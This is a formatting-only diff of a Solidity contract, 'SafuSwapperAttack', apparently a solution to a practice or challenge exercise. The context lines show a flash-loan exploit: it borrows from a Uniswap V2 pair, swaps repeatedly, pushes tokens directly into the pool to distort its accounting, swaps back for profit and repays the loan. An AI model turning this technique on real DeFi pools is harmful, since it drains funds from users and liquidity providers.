@@ -28,13 +28,13 @@ contract SafuSwapperAttack {
         usdc.transfer({to: msg.sender, amount: attackerAmount});
     }
 
-    function uniswapV2Call(address, uint256 amount0, uint256 , bytes calldata) external {
+    function uniswapV2Call(address, uint256 amount0, uint256, bytes calldata) external {
         // approve tokens for transfer
         safu.approve({spender: address(safuPool), amount: type(uint256).max});
         usdc.approve({spender: address(safuPool), amount: type(uint256).max});
 
         // swap some USDC to get SAFU
-        for(uint256 i; i < 5; i++) {
+        for (uint256 i; i < 5; i++) {
             safuPool.swap({toToken: address(safu), amount: 10_000e18});
         }
 
@@ -50,7 +50,7 @@ contract SafuSwapperAttack {
         console.log("baseAmount ", safuPool.baseAmount());
         console.log("tokenAmount", safuPool.tokenAmount());
 
-        for(uint256 i; i < 5; i++) {
+        for (uint256 i; i < 5; i++) {
             safuPool.swap({toToken: address(safu), amount: 10_000e18});
         }
 
@@ -61,9 +61,9 @@ contract SafuSwapperAttack {
         console.log("USDC balance", usdc.balanceOf(address(safuPool)));
 
         safuBalance = safu.balanceOf(address(this));
-        console.log("SAFUBALANCE*3", safuBalance*3);
+        console.log("SAFUBALANCE*3", safuBalance * 3);
         uint256 usdcBalance = usdc.balanceOf(address(this));
-        console.log("usdcBalance", usdcBalance/2);
+        console.log("usdcBalance", usdcBalance / 2);
 
         safu.transfer({to: address(safuPool), amount: safuBalance});
         usdc.transfer({to: address(safuPool), amount: 600_000e18});
@@ -98,13 +98,13 @@ contract SafuSwapperAttack {
         console.log("SAFU balance", safu.balanceOf(address(safuPool)));
         console.log("USDC balance", usdc.balanceOf(address(safuPool)));
 
-        safuBalance = safu.balanceOf(address(this))/15;
+        safuBalance = safu.balanceOf(address(this)) / 15;
 
-        for(uint256 i; i < 10; i++) {
+        for (uint256 i; i < 10; i++) {
             safuPool.swap({toToken: address(usdc), amount: safuBalance});
         }
-        
-        uint256 loanPlusInterest = (amount0*(10**18)*1000/997/(10**18))+1;
+
+        uint256 loanPlusInterest = (amount0 * (10 ** 18) * 1000 / 997 / (10 ** 18)) + 1;
         usdc.transfer({to: address(uniPair), amount: loanPlusInterest});
-    } 
+    }
 }
